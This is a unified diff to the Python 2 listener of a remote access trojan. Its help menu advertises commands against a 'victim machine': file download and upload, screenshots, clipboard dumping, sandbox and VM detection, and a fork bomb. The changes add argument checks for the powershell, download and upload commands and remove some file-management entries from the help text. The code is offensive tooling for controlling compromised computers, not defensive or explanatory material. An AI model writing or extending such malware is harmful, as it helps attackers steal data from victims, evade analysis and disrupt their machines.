@@ -18,15 +18,10 @@ help = """
 \n
 ********************************************************************************
 * help -> print this help message                                              *
-* cd ->  change directory                                                      *
-* pwd -> print current working directory                                       *
 * download [file name] -> download a file (not directory)                      *
 * upload [file name]  -> upload a file (not directory)                         *
 * sysinfo  -> print system and OS information                                  *
 * shot -> take a screenshot                                                    *
-* rm -> remove a file                                                          *
-* rmdir -> remove a directory                                                  *
-* mkdir -> create a new directory                                              *
 * chk  -> check if the system is a sandbox or VM                               *
 * clip -> dump clipboard                                                       *
 * fork -> run a fork bomb in victim machine                                    *
@@ -78,7 +73,6 @@ class listener:
 
     def receive(self):
         json_data = ""
-
         while True:
             try:
                 json_data = json_data + self.conn.recv(4096)
@@ -97,7 +91,6 @@ class listener:
     def run(self):
         shot_count = 1
         enum_count = 1
-
         while True:
             cmd = raw_input(str(ip)+" >> ")
             cmd=cmd.split(" ")
@@ -116,17 +109,27 @@ class listener:
                         else:
                             continue
                     pass
-                elif cmd[0]=="upload" :
+                elif cmd[0] == "powershell" and not cmd[1:]:
+                    print red,"usage: powershell [cmd] OR [script] ",r
+                    cmd = ""
+
+                elif cmd[0] == "download" and not cmd [1:] or cmd[0] == "upload" and not cmd [1:]:
+                    print red,"usage: download/upload [file name] ",r
+                    cmd = ""
+
+                elif cmd[0] == "upload" and cmd[1]:
                     print blue,"[*] uploading ", str(cmd[1:]) , "...",r
                     file_content=self.read_file(cmd[1])
                     cmd.append(file_content)
                 result = self.execution(cmd)
                 if result == None:
                     pass
-                elif cmd[0]=="download":
+                elif cmd[0]=="download"  and cmd[1]:
                     print blue,"[*] Downloading " , ''.join(str(cmd[1])) , "...",r
+
                     result = self.write_file(cmd[1],result)
                     print(result)
+
                 elif cmd[0] == "shot":
                     name = "screenshot%s.png" % str(shot_count)
                     result=self.write_file(name,result)
@@ -141,11 +144,8 @@ class listener:
                         print green,"[*] enumeration completed successfully, results saved to %s [*]" % name ,r
                     except:
                         print red,"[!] enumeration failed [!]"
-
-
                     enum_count += 1
                 else:
-
                     print(result)
             except Exception:
                 result = Exception
